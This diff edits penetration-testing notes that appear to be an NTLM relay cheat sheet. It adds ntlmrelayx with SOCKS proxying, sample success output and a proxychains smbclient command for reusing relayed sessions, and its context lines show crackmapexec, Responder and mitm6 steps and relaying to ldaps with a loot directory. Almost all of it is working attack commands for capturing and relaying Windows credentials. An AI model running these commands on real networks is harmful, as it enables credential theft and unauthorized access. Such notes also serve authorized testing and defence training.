@@ -97,6 +97,15 @@ crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 # 3. After we can run ntlmrelayx
 impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --output-file relayed-hash.txt
 
+also : 
+
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -socks -smb2support --output-file relayed-hash-with-socks.txt
+# if you get socks 
+# [*] Authenticating against smb://192.168.1.3 as <Domain>\<User> SUCCEED
+# [*] SOCKS: Adding <Domain>/<User>@192.168.1.3(445) to active SOCKS connection. Enjoy
+# you can do this : `proxychains smbclient.py -no-pass <Domain>/<User>@<ip>`
+# make sure /etc/proxychains.conf is set to 1080
+
 # 4. Finally, using another shell, we can run Responder
 ## Light
 ./Responder.py -I eth0 
@@ -114,7 +123,7 @@ mitm6 + NTLMrelayx
 
 ```bash
 sudo mitm6 -d <domain.fqdn> --ignore-nofqdn
-impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 --output-file relayed-hash.txt
 
 # If no smb available, try ldap/ldaps/mssql : 
 impacket-ntlmrelayx -t ldaps://<target> -l lootdir
